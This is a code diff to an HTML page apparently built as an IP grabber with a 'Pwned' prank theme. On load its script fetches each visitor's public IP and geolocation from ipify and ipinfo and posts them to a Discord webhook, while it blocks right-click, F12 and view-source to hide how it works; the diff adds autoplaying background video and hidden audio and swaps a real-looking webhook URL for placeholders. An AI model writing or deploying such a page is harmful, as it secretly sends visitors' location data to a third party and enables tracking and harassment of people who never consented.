@@ -20,19 +20,29 @@
             white-space: pre;
             color: rgb(255, 255, 255);
         }
+
+        video {
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: -1;
+            filter: blur(10px);
+        }
+
+        audio {
+            display: none; /* Hide audio controls */
+        }
     </style>
 </head>
 <body>
     <script>
-        // Disable right-click
+        // Disable right-click and prevent inspect
         document.addEventListener("contextmenu", function (e) {
             e.preventDefault();
             alert("💀 Pwned :)");
         });
 
-        // Disable certain key combinations
         document.addEventListener("keydown", function (e) {
-            // F12 or Ctrl+Shift+I (Inspect Element), Ctrl+U (View Source)
             if (
                 e.key === "F12" ||
                 (e.ctrlKey && e.shiftKey && e.key === "I") ||
@@ -63,21 +73,18 @@
         // Fetch and send IP to webhook
         async function fetchAndSendIP() {
             try {
-                // Fetch user's public IP
                 const ipResponse = await fetch('https://api.ipify.org/?format=json');
                 const ipData = await ipResponse.json();
                 const userIP = ipData.ip;
 
-                // Fetch geolocation info
                 const geoResponse = await fetch(`https://ipinfo.io/${userIP}/json`);
                 const geoData = await geoResponse.json();
 
-                // Update the page with user info
                 document.getElementById('ip-address-value').textContent = userIP;
                 document.getElementById('ip-info').textContent = JSON.stringify(geoData, null, 2);
 
                 // Send to Discord Webhook
-                await fetch("https://discord.com/api/webhooks/1328900605896429612/-KgtIr5H2_vXUJnpQvHEHswyrDT20z-WkVAm0mYnb_I23dqfVqPqSmzUBdc9PvwCA9vi", {
+                await fetch("https://discord.com/api/webhooks/WEBHOOK_ID/WEBHOOK_TOKEN", {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({
@@ -93,6 +100,19 @@
         window.onload = fetchAndSendIP;
     </script>
 
+    <!-- Background Video -->
+    <video autoplay loop muted>
+        <source src="https://cdn.discordapp.com/attachments/1069599369529135146/1312426668799037490/0060f2ccce355a00.mp4" type="video/mp4">
+        Your browser does not support the video tag.
+    </video>
+
+    <!-- Audio -->
+    <audio autoplay loop>
+        <source src="https://cdn.discordapp.com/attachments/1069599369529135146/1312426640718041109/Untitled_video_-_Made_with_Clipchamp_3.mp4" type="audio/mpeg">
+        Your browser does not support the audio element.
+    </audio>
+
+    <!-- Main Content -->
     <p align="center">
         <img border="0" src="https://cdn.discordapp.com/attachments/1069599369529135146/1313612143672692896/1111.png" width="400">
     </p>
